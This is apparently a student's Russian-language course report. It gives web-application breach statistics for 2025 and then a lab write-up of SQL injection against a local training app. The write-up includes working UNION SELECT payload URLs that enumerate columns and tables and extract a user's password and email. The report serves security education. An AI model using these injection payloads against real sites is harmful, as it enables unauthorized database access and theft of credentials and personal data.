	Наибольшему риску взломов подверглись ретейл, промышленность, сфера здравоохранения, государственные службы и информационные технологии.  
  
# Часть 1
### Ссылки на источники
1. https://www.anti-malware.ru/analytics/Threat_Analysis/Web-Application-Security-Outlook-for-2025#section-3
2. https://rt-solar.ru/solar-4rays/blog/6142/
3. https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi

### Статистика 
- Около 225 крупных инцидентов
- Более 767 млн строк данных в публичном доступе 
- Большинство уязвимостей имеют высокий или очень высокий уровень критичности 
- Ко­личес­тво уяз­ви­мос­тей в рос­сий­ских и за­рубеж­ных веб-при­ложе­ниях в 2025 г. вы­рос­ло поч­ти в 3,2 ра­за в срав­не­нии с 2024 г. 
- В конце 2025 года количество атак возросло в сравнении со всем годом 

**Основные уязвимости:**
- React2Shell  
- CWE-79 (некорректная нейтрализация ввода во время генерации веб-страницы)
- CWE-89 (SQL-инъекция)
- CWE-352 (подделка межсайтовых запросов)
- MITRE ATT&CK
- CWE-434 (неограниченная загрузка файлов опасного типа)
- IDOR (прямые ссылки на объект без проверки прав пользователя)

**Тренды:**
- Появление атак, выполненных практически полностью с помощью нейросетей почти без участия человека
- Растущий тренд на уязвимости в ИИ-сервисах.

--- 

# Часть 2
### Задание 1
1. После запуска проекта, при нажатии на "Установить/сбросить базу" и нажатии на "Приступить к выполнению заданий" необходимо ввести id, но поля ввода нет. Пробую написать что-то в поле URL:
	- http://localhost:8080/task/1 - не даёт результата 
	- Попробую явно прописать, что это id равен 1: http://localhost:8080/task/id=1. Тоже без результатов 
	- Погуглила примеры sql инъекций, пробую перед запросом поставить знак $ :  http://localhost:8080/task/$id=1. Опять не работает. 
	- Ещё есть вариант со знаком вопроса. http://localhost:8080/task/?id=1 - выдал результат:
		  `Ваш id:1`  
		  `Ваш логин:admin`
2. Попробую явно ввести логин как login или логин [http://localhost:8080/task/?login=Volk2.] Вернулась на страницу с надписью ```Введите в качестве параметра ваш id```. 
3. Беру название логина в кавычки http://localhost:8080/task/?login='Volk2'. Тоже не помогло 
4. Ладно, попробую перебрать номера id: 
```
	Ваш id:2  
	Ваш логин:Volk
	
	Ваш id:3  
	Ваш логин:Matroskin
	
	Ваш id:4  
	Ваш логин:Vinni-pukh
	
	Ваш id:5  
	Ваш логин:Neznaika
	
	Ваш id:6  
	Ваш логин:kotenok
	
	Ваш id:7  
	Ваш логин:Karlson
	
	Ваш id:8  
	Ваш логин:Kesha
	
	Ваш id:9  
	Ваш логин:Volk2
```

5. Попробую поставить кавычку после запроса http://localhost:8080/task/?id=1' - получила ошибку **You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1**, что показывает структуру запроса WHERE id = ''1''' LIMIT 0,1
6. Попробую узнать, сколько полей в SELECT. Для этого напишу запрос с ORDER BY: http://localhost:8080/task/?id=-1' ORDER BY 1%23 - ничего не вывел 
http://localhost:8080/task/?id=-1' ORDER BY 2%23 - ничего не вывел 
http://localhost:8080/task/?id=-1' ORDER BY 3%23 - ничего не вывел 
http://localhost:8080/task/?id=-1' ORDER BY 4%23 - выдал ошибку
Это значит, что в исходном select запросе используется 3 поля
7. Попробуем ввести запрос http://localhost:8080/task/?id=-1' UNION SELECT 1,2,3%23 для определения, какое поле где именно отображается. Получила 
Ваш id:1
Ваш логин:2 
Это значит, что первое поле - это id, второе поле - логин
8. Так, а теперь попробуем написать вот такой запрос 
 SELECT password, id, username FROM users WHERE id=9 как sql инъекцию:
http://localhost:8080/task/?id=-1' UNION SELECT password, id, username FROM users WHERE id=9%23
Ура, победа, я получила 
```
Ваш id:Wa spoiuuuuu  
Ваш логин:9
```
Это значит, что пароль у пользователя с логином Volk2: Wa spoiuuuuu.
**Ответ: Wa spoiuuuuu**

---
### Задание 2
1. В прошлом задании я выяснила, что id у Vinni-pukh =4 и в таблице 3 поля, то есть, скорее всего, email находится в другой таблице
2. Нужно написать такой запрос, чтобы получить названия таблиц. Это будет запрос http://localhost:8080/task/?id=-1' UNION SELECT GROUP_CONCAT(TABLE_NAME), 2, 3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND '1'='1
Здесь GROUP_CONCAT(TABLE_NAME) выдаст все названия таблиц в одну строку через запятую. AND '1'='1 стоит в конце, потому что при замене его на -- или # у меня ничего не работает, почитала, узнала, что можно написать такое условие, оно сработало. 
Запрос выдаёт 
```
Ваш id:id,email_id  
Ваш логин:2
```
3. Теперь посмотрим данные из таблицы emails_id. Пишу вот такой запрос: http://localhost:8080/task/?id=-1' UNION SELECT id, email_id, 3 FROM emails AND '1'='1. Получаю ошибку **You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AND '1'='1' LIMIT 0,1' at line 1**. 
4. После FROM нужен WHERE. Уберу AND и добавлю WHERE: http://localhost:8080/task/?id=-1' UNION SELECT id, email_id, 3 FROM emails WHERE '1'='1. Сработало, получилось 
```
Ваш id:1  
Ваш логин:admin@otus-lab.com
```
Но, кажется, это не совсем то, что мне нужно 
5. Добавлю условие, что id=4:
http://localhost:8080/task/?id=-1' UNION SELECT id, email_id, 3 FROM emails WHERE id=4
Получаю ошибку: **You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1**
6. Опять добавляю AND '1'='1 в конец, запрос полностью теперь выглядит так: 
   http://localhost:8080/task/?id=-1' UNION SELECT id, email_id, 3 FROM emails WHERE id=4 AND '1'='1. Ура, успех, получаю вывод: 
   ```
   Ваш id:4  
   Ваш логин:honey_lover@otus-lab.com
   ```
   Сначала у меня идёт id, потом email_id, поэтому почта во втором поле. 
**Ответ: honey_lover@otus-lab.com**
